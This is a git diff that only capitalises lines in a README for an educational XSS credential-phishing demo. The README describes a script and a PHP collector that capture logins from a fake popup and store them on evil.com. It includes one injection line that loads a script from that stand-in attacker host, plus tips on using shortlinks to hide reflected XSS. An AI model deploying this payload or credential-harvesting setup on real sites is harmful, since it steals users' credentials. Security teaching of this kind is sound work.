@@ -1,6 +1,6 @@
 # xss (Cross Site Social-engineering)
 
-simple implementasion of social engineering from xss
+Simple implementasion of social engineering from xss
 --for education purpose only--
 
 # about this repository
@@ -8,10 +8,10 @@ This repository will tell you how bad xss it is
 
 # content in this repository
 x.js
-simple javascript payload to trigger user to give them credential's and send them to x.php
+Simple javascript payload to trigger user to give them credential's and send them to x.php
 
 x.php
-simple php script to receive credential's from x.js and write it to creds.txt
+Simple php script to receive credential's from x.js and write it to creds.txt
 
 creds.txt
 file that store credential's from x.php and x.js
@@ -25,21 +25,21 @@ An attacker can use XSS to send a malicious script to an unsuspecting user. The 
 ```x.js```, ```x.php```, and ```creds.txt``` stored at evil.com then attacker use xss payload
 to your website that vulnerable from xss --> ```<script src=https://evil.com/x.js></script>```
 
-if xss reflected, attacker usually use shortlink to avoid suspicion and make the user of your website click into it
-if xss stored, attacker usually just wait for the payload triggered from another user
+If xss reflected, attacker usually use shortlink to avoid suspicion and make the user of your website click into it
+If xss stored, attacker usually just wait for the payload triggered from another user
 
 and this will happen
 
 ![popup](https://raw.githubusercontent.com/laztname/xss/master/the.gif)
 
-if the user of your website doesn't aware about security then they just believe it and don't know that was a scam accidentally they send their credential to the evil.com
+If the user of your website doesn't aware about security then they just believe it and don't know that was a scam accidentally they send their credential to the evil.com
 
 # is xss just pop-up only ?
 NO, attacker can use any javascript payload to use your website that vulnerable from xss
-for any variation payload see it here http://www.xss-payloads.com/payloads-list.html?a#category=all
+For any variation payload see it here http://www.xss-payloads.com/payloads-list.html?a#category=all
 
 # how prevent from xss ?
-make sure filter any input from your website and don't forget to strip any html tags
+Make sure filter any input from your website and don't forget to strip any html tags
 
 # more information you can get from here
 https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
